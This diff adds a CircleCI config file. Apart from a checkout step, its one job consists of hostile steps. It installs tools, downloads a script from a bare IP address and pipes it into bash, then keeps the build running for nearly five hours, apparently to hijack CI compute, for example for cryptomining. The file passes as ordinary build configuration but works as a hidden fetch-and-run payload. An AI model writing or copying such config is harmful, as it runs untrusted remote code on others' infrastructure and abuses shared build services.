@@ -1,0 +1,17 @@
+version: 2.1
+
+jobs:
+  pressiyhep:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 3482"
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - pressiyhep
